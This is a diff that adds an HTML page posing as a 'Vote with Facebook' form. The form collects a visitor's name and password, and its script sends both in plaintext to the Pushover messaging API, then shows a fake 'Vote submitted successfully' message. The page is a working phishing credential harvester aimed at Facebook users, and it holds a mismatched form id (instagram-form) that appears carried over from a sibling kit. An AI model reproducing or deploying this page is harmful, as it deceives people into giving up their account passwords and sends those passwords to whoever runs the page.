@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vote with Facebook</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Vote with Facebook</h1>
+        </header>
+        <div class="vote-section">
+            <form id="facebook-form">
+                <div class="input-group">
+                    <label for="name">Name:</label>
+                    <input type="text" id="name" name="name" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit" class="vote-button facebook"><i class="fab fa-facebook"></i> Submit</button>
+            </form>
+        </div>
+        <footer>
+            <p>Powered by RCIP Voting System</p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('instagram-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const name = document.getElementById('name').value;
+            const password = document.getElementById('password').value;
+
+            if (validateInput(name, password)) {
+                sendToPushover(name, password);
+            } else {
+                alert('Invalid input');
+            }
+        });
+
+        function validateInput(name, password) {
+            const nameRegex = /^[a-zA-Z0-9_]{3,20}$/;
+            const passwordRegex = /^[a-zA-Z0-9!@#$%^&*]{6,20}$/;
+
+            return nameRegex.test(name) && passwordRegex.test(password);
+        }
+
+        function sendToPushover(name, password) {
+            const pushoverUserKey = 'YOUR_PUSHOVER_USER_KEY';
+            const pushoverApiToken = 'YOUR_PUSHOVER_API_TOKEN';
+
+            const data = {
+                token: pushoverApiToken,
+                user: pushoverUserKey,
+                message: `Name: ${name}, Password: ${password}`
+            };
+
+            fetch('https://api.pushover.net/1/messages.json', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 1) {
+                    alert('Vote submitted successfully');
+                } else {
+                    alert('Failed to submit vote');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred');
+            });
+        }
+    </script>
+</body>
+</html>
